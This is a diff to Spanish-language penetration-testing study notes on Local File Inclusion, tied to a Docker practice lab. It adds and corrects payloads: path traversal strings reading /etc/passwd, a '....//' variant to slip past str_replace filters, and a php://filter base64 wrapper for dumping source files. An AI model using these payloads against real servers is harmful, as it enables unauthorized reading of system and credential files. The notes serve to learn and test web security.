@@ -19,7 +19,7 @@ A continuación, se os proporciona el enlace directo a la herramienta que utiliz
 - [Lab-LFI](https://github.com/NetsecExplained/docker-labs)
 
 ```bash 
-Encontrar un parámetro similar a '?page= o ?file=' para ver si existe el LFI
+Encontrar un parámetro similar a '?page= o ?file= o ?view=' para ver si existe el LFI
 
 1. Se encuentran en CMS (Gestores de contenido) como WordPress
 2. Plugins 
@@ -52,7 +52,8 @@ En el LFI se puede usar:
 # Como mejor practica son 6 '../'
 
 ❯ /etc/passwd                       # Cargar el archivo desde la raiz  
-❯ ../../../../etc/passwd             
+❯ ../../../../etc/passwd     
+❯ ..//..//..//..//etc/passwd      
 ❯ ....//....//....//etc/passwd      # Evitar el filtro de 'str_replace' 
 
 
@@ -85,7 +86,7 @@ En el LFI se puede usar:
 
 
 1. # Este filtro representa el contenido en base64
-❯ php://filter/convert.base64-encode/resourse=
+❯ php://filter/convert.base64-encode/resource=
 	❯ cat data | base64 -d | sponge data 
 	# d = decodear la base64 
 	# sponge = Para ingresar el output en el mismo archivo llamado 'data'
